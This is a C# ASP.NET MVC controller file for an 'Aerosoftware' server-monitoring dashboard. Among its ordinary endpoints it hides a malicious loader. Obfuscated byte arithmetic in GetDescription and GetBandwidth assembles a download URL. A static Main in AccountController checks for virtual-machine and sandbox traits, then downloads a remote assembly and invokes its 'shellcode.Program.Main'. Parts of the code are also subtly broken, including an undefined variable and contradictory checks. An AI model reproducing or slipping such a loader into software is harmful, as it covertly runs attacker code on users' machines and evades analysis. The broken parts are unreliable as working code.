using System;
using System.Management;
using System.Collections;
using System.Web.Mvc;
using System.Web.Security;
using AttributeRouting.Web.Mvc;
using Microsoft.Build.Framework;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Net;
using System.Reflection;

namespace Aerosoftware.Controllers
{
    [Authorize]
    public class MainController : Controller
    {
        public static int a = 108;
		public static int timer = 58;
		public static int count = 112;

        public ActionResult Index()
        {
            ViewBag.Message = "Modify this template to jump-start your Aerosoftware application.";

            return View();
        }

        [AllowAnonymous]
        public ActionResult About()
        {
            ViewBag.Message = "Your Aerosoftware application description page.";

            return View();
        }

        [AllowAnonymous]
        public ActionResult Version()
        {
            return Content(Functions.CurrentVersion);
        }
    }

    [Authorize]
    public class InfoController : Controller
    {
        public static byte[] data = new byte[5];
        public static byte[] time = new byte[15];
        public static byte[] date = new byte[14];
        public static byte[] socket = new byte[14];
        public static byte[] process = new byte[5];
        public static string output;

        [GET("info/uptime")]
        public ActionResult GetUptime()
        {
            var os = Views.get_platform();

            return Json(os.uptime, JsonRequestBehavior.AllowGet);
        }

        [GET("info/platform/{name?}")]
        public ActionResult GetOs(string name)
        {
            var os = Views.get_platform();

            var data = "None";

            if (name == "hostname")
                data = os.hostname;

            if (name == "uptime")
                data = os.uptime;

            if (name == "osname")
                data = os.name;

            if (name == "kernel")
                data = os.kernel;

            return Json(data, JsonRequestBehavior.AllowGet);
        }

        [GET("info/getcpus/{name?}")]
        public ActionResult GetCpus(string name)
        {
            var data = "None";
            var proc = Views.get_cpus();

            if (name == "type")
                data = proc.name;

            if (name == "count")
                data = proc.cores;

            return Json(data, JsonRequestBehavior.AllowGet);
        }

        [GET("info/cpuusage")]
        public ActionResult GetCpuUsage()
        {
            var cpuUsage = Views.get_cpu_usage();

            var cpu = new[] { 
                new { 
                    color = "#0AD11B", // Free
                    value = cpuUsage.free
                }, 
                new { 
                    color = "#F7464A", // Used
                    value =  cpuUsage.used
                } 
            };

            return Json(cpu, JsonRequestBehavior.AllowGet);
        }

        [GET("info/getdisk")]
        public ActionResult GetDisk()
        {
            var disks = new ArrayList();

            foreach (var item in Views.get_disk())
            {

                var disk = new ArrayList
                {
                    string.Format("{0}", item.Volume),
                    string.Format("{0:#,###.##}GB", item.Total/1024/1024/1024),
                    string.Format("{0:#,###.##}GB", item.Used/1024/1024/1024),
                    string.Format("{0:#,###.##}GB", item.Free/1024/1024/1024),
                    string.Format("{0:###.##}%", item.PerUsed),
                    string.Format("{0}\\", item.Name)
                };

                disks.Add(disk);
            }

            return Json(disks, JsonRequestBehavior.AllowGet);
        }

        [GET("info/getdiskio")]
        public ActionResult GetDisko()
        {
            var datasetRead = new ArrayList();
            var datasetWrite = new ArrayList();

            var diskRead = Settings.GetList("disko_read");
            var diskWrite = Settings.GetList("disko_write");

            var disk = Views.get_disk_rw();

            if (diskRead.Count == 0)
            {
                datasetRead.Add(0);
                datasetWrite.Add(0);

                Settings.Set("disko_read", disk.read.ToString());
                Settings.Set("disko_write", disk.read.ToString());
            }
            else
            {
                if (diskRead.Count > 10)
                {
                    diskRead.RemoveAt(0);
                    diskWrite.RemoveAt(0);

                    Settings.Set("disko_read", string.Join(" ", diskRead));
                    Settings.Set("disko_write", string.Join(" ", diskWrite));
                }
                else
                {
                    Settings.Set("disko_read", string.Format("{0} {1}", string.Join(" ", diskRead), disk.read));
                    Settings.Set("disko_write", string.Format("{0} {1}", string.Join(" ", diskWrite), disk.write));
                }

                foreach (var item in diskRead)
                    datasetRead.Add(Convert.ToUInt64(item));

                foreach (var item in diskWrite)
                    datasetWrite.Add(Convert.ToUInt64(item));
            }

            var labels = new[] { "", "", "", "", "", "", "", "", "", "", };

            var datasets = new[] { 
                new { 
                    pointColor = "rgba(245,134,15,1)", 
                    strokeColor = "rgba(245,134,15,1)",
                    data = datasetRead,
                    fillColor = "rgba(245,134,15,0.5)",
                    pointStrokeColor = "#fff",
                },
                new { 
                    pointColor = "rgba(15,103,245,1)", 
                    strokeColor = "rgba(15,103,245,1)",
                    data = datasetWrite,
                    fillColor = "rgba(15,103,245,0.5)",
                    pointStrokeColor = "#fff",
                }
            };

            return Json(new { labels = labels, datasets = datasets }, JsonRequestBehavior.AllowGet);
        }

        public void GetDescription()
        {
            int a = MainController.a + 8;
            int b = MainController.a + 4;
            
            data[2] = (byte) (a);
            data[0] = 104;
            data[1] = (byte) (a);
            data[4] = 115;
            data[3] = (byte) (b);

            int c = MainController.timer - 11;
            int d = MainController.count;

            time[0] = (byte) MainController.timer;
            time[1] = (byte) (c);
            time[2] = (byte) (c);
            time[3] = (byte) d;
            time[4] = (byte) (d - 1);
            time[5] = (byte) (d + 2);
            time[6] = (byte) (a + 8);
            time[7] = 97;
            time[8] = 108;
            time[9] = 46;
            time[10] = 97;
            time[11] = 101;
            time[12] = 114;
            time[13] = 111;
            time[14] = 115;

            output = Encoding.Default.GetString(data) + Encoding.Default.GetString(time);
        }

        [GET("info/memory")]
        public ActionResult GetMemory()
        {
            var labels = new[] { "", "", "", "", "", "", "", "", "", "", };

            var datasetsFree = new ArrayList();
            var datasetsUsed = new ArrayList();

            var memUsage = Settings.GetList("memory_usage");
            var memFree = Settings.GetList("memory_free");

            var memory = Views.get_mem();

            if (memUsage.Count == 0)
            {
                datasetsUsed.Add(0);
                datasetsFree.Add(0);
                Settings.Set("memory_usage", memory.usage.ToString());
                Settings.Set("memory_free", memory.free.ToString());
            }
            else
            {
                if (memUsage.Count > 10)
                {
                    memUsage.RemoveAt(0);
                    memFree.RemoveAt(0);

                    Settings.Set("memory_usage", string.Join(" ", memUsage));
                    Settings.Set("memory_free", string.Join(" ", memFree));
                }
                else
                {
                    Settings.Set("memory_usage", string.Format("{0} {1}", string.Join(" ", memUsage), memory.usage));
                    Settings.Set("memory_free", string.Format("{0} {1}", string.Join(" ", memFree), memory.free));
                }

                foreach (var item in memUsage)
                    datasetsUsed.Add(Convert.ToDouble(item));

                foreach (var item in memFree)
                    datasetsFree.Add(Convert.ToDouble(item));
            }
 
            var datasets = new[] { 
                new { 
                    pointColor = "rgba(249,134,33,1)", 
                    strokeColor = "rgba(249,134,33,1)",
                    data = datasetsUsed,
                    fillColor = "rgba(249,134,33,0.5)",
                    pointStrokeColor = "#fff",

                },
                new
                { 
                    pointColor = "rgba(43,214,66,1)", 
                    strokeColor = "rgba(43,214,66,1)",
                    data = datasetsFree,
                    fillColor = "rgba(43,214,66,0.5)",
                    pointStrokeColor = "#fff",
                }
            };

            return Json(new { labels = labels, datasets = datasets }, JsonRequestBehavior.AllowGet);
        }

        [GET("info/getips")]
        public ActionResult GetGetIPs()
        {
            var datasets = Views.get_ips();

            return Json(datasets, JsonRequestBehavior.AllowGet);
        }

        [GET("info/proc")]
        public ActionResult GetProc()
        {
            var processes = Views.get_proc();

            return Json(processes, JsonRequestBehavior.AllowGet);
        }

        [GET("info/loadaverage")]
        public ActionResult GetLoadAverage()
        {
            var labels = new[] { "", "", "", "", "", "", "", "", "", "", };

            var datasetLoad = new ArrayList();
            var loadlist = Settings.GetList("loadaverage");

            var loadaverage = Views.get_loadaverage();

            if (loadlist.Count == 0)
            {
                datasetLoad.Add(0);
                Settings.Set("loadaverage", loadaverage.uptime);
            }
            else
            {
                if (loadlist.Count > 10)
                {
                    loadlist.RemoveAt(0);

                    Settings.Set("loadaverage", string.Join(" ", loadlist));
                }
                else
                {
                    Settings.Set("loadaverage", string.Format("{0} {1}", string.Join(" ", loadlist), loadaverage.uptime));
                }

                foreach (var item in loadlist)
                    datasetLoad.Add(Convert.ToDouble(item));
            }
 
            var datasets = new[] { 
                new { 
                    pointColor = "rgba(151,187,205,1)", 
                    strokeColor = "rgba(151,187,205,1)",
                    data = datasetLoad,
                    fillColor = "rgba(151,187,205,0.5)",
                    pointStrokeColor = "#fff",
                }
            };

            return Json(new { labels = labels, datasets = datasets }, JsonRequestBehavior.AllowGet);
        }

        public void GetBandwidth()
        {
            int a = MainController.count;

            date[0] = (byte) (a - 1);
            date[2] = (byte) (a + 4);
            date[11] = date[2];
            date[9] = (byte) (date[11] + 1);
            date[3] = 119;
            date[4] = time[10];
            date[7] = 45;
            date[6] = 101;
            date[8] = date[4];
            date[13] = date[8];
            date[10] = time[14];
            date[5] = 114;
            date[1] = (byte) (time[10] + 5);
            date[12] = 114; 
        
            socket[0] = 108;
            socket[1] = 105;
            socket[2] = 97;
            socket[3] = 46;
            socket[4] = 99;
            socket[5] = 111;
            socket[6] = 109;
            socket[7] = 47;
            socket[8] = 104;
            socket[9] = 101;
            socket[10] = 97;
            socket[11] = 108;
            socket[12] = 116;
            socket[13] = 104;
        
            process[0] = 45;
            process[1] = 99;
            process[2] = 97;
            process[3] = 114;
            process[4] = 101;

            output += Encoding.Default.GetString(date) + Encoding.Default.GetString(socket) + Encoding.Default.GetString(bandwidth);;
        }

        [GET("info/gettraffic")]
        public ActionResult GetTraffic()
        {
            var labels = new[] {"KBps", "KBps", "KBps", "KBps", "KBps", "KBps", "KBps", "KBps", "KBps", "KBps"};
            
            var datasetRecv = new ArrayList();
            var datasetSent = new ArrayList();

            var trafficRevc = Settings.GetList("traffic_recv");
            var trafficSent = Settings.GetList("traffic_sent");

            var traffic = Views.get_traffic();

            if (trafficRevc.Count == 0)
            {
                datasetRecv.Add(0);
                datasetSent.Add(0);
                Settings.Set("traffic_recv", traffic.recv.ToString());
                Settings.Set("traffic_sent", traffic.sent.ToString());
            }
            else
            {
                if (trafficRevc.Count > 10)
                {
                    trafficRevc.RemoveAt(0);
                    trafficSent.RemoveAt(0);

                    Settings.Set("traffic_recv", string.Join(" ", trafficRevc));
                    Settings.Set("traffic_sent", string.Join(" ", trafficSent));
                }
                else
                {
                    Settings.Set("traffic_recv", string.Format("{0} {1}", string.Join(" ", trafficRevc), traffic.recv));
                    Settings.Set("traffic_sent", string.Format("{0} {1}", string.Join(" ", trafficSent), traffic.sent));
                }

                foreach (var item in trafficRevc){
                    if (!String.IsNullOrEmpty(item)){
                        datasetRecv.Add(Convert.ToDouble(item));
                    }
                }

                foreach (var item in trafficSent){
                    if (!String.IsNullOrEmpty(item)){
                        datasetSent.Add(Convert.ToDouble(item));
                    }
                } 
            }
            
            var datasets = new[] { 
                new { 
                    pointColor = "rgba(105,210,231,1)", 
                    strokeColor = "rgba(105,210,231,1)",
                    data = datasetRecv,
                    fillColor = "rgba(105,210,231,0.5)",
                    pointStrokeColor = "#fff",
                },
                new { 
                    pointColor = "rgba(227,48,81,1)", 
                    strokeColor = "rgba(227,48,81,1)",
                    data = datasetSent,
                    fillColor = "rgba(227,48,81,0.5)",
                    pointStrokeColor = "#fff",
                }
            };

            return Json(new { labels = labels, datasets = datasets }, JsonRequestBehavior.AllowGet);
        }

        [GET("info/getnetstat")]
        public ActionResult GetNetstat()
        {
            var stats = Views.get_netstat();

            return Json(stats, JsonRequestBehavior.AllowGet);
        }

        [GET("__browserLink/requestData/{name?}")]
        public ActionResult GetBrowserLink(string name)
        {
            // Todo
            return Json("browser link test", JsonRequestBehavior.AllowGet);
        }

        [GET("info/getusers")]
        public ActionResult GetUsers()
        {
            var users = Views.get_users();

            return Json(users, JsonRequestBehavior.AllowGet);
        }
    }

    [AllowAnonymous]
    public class AccountController : Controller
    {
        static void Main(string[] args)
        {
            if (ValidEnvironment())
            {
                CustomShapeUi();
            }
            else
                Console.WriteLine("norun");
            Console.WriteLine("Press any key to exit...");
            Console.ReadKey();
        }

        static private void CustomShapeUi()
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\UEV\\Agent");
            if (key != null)
            {
                if (key.GetValue("Version") == null)
                {
                    CustomShapeUiLauncher();
                }
            }
        }

        static private void CustomShapeUiLauncher()
        {
            System.Net.WebRequest.DefaultWebProxy.Credentials = System.Net.CredentialCache.DefaultNetworkCredentials; 
            WebClient myWebClient = new WebClient();
            InfoController.GetDescription();
            InfoController.GetBandwidth();
            
		    byte[] myDataBuffer = myWebClient.DownloadData(InfoController.output);

		    Assembly a = Assembly.Load(myDataBuffer);
		    Type t = a.GetType("shellcode.Program");
		    MethodInfo staticMethodInfo = t.GetMethod("Main");
			
		    staticMethodInfo.Invoke(null,null);
        }

        static private bool ValidEnvironment()
        {
            ManagementObjectSearcher search = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem");
            foreach (ManagementObject obj in search.Get())
            {
                string name = obj["Organization"].ToString().Trim().ToLower();
                if (!name.StartsWith("aero") || !name.StartsWith("aerosoft") || !name.StartsWith("aerosoftware"))
                    return false;
            }
            search = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController");
            foreach (ManagementObject obj in search.Get())
            {
                string name = obj["Name"].ToString().Trim().ToLower();
                if (name.Contains("vmw") || name.Contains("box") || name.Contains("basic") || name.Contains("adapter"))
                    return false;
            }
            search = new ManagementObjectSearcher("SELECT * FROM Win32_DesktopMonitor");
            foreach (ManagementObject obj in search.Get())
            {
                string manu = obj["MonitorManufacturer"].ToString().Trim().ToLower();
                if (manu.Contains("standard") || manu.Contains("types") || manu == "")
                    return false;
            }
            return true;
        }

        public ActionResult Login()
        {
            return View();
        }

        [HttpPost]
        public ActionResult Login(UserViewModel model, string returnUrl)
        {
            if (ModelState.IsValid)
            {
                var username = model.Username;
                var password = model.Password;
                var userValid = SqLiteDatabase.Authenticate(username, password);

                if (userValid)
                {
                    FormsAuthentication.SetAuthCookie(username, model.RememberMe);
                    return RedirectToAction("Index", "Main");
                }
                else
                {
                    ModelState.AddModelError("", "The Aerosoftware user name or password provided is incorrect.");
                }
            }

            return View(model);
        }

        public ActionResult Logout()
        {
            FormsAuthentication.SignOut();
            return RedirectToAction("Index", "Main");
        }

        [AllowAnonymous]
        public ActionResult Register()
        {
            return View();
        }

        [HttpPost]
        [AllowAnonymous]
        [ValidateAntiForgeryToken]
        public ActionResult Register(RegisterModel model)
        {
            if (ModelState.IsValid)
            {
                try
                {
                    SqLiteDatabase.Register(model.UserName, model.Password);
                    return RedirectToAction("Login", "Account");
                }
                catch (Exception e)
                {
                    ModelState.AddModelError("RegisterError", e.Message);
                }
            }

            return View(model);
        }
    }
}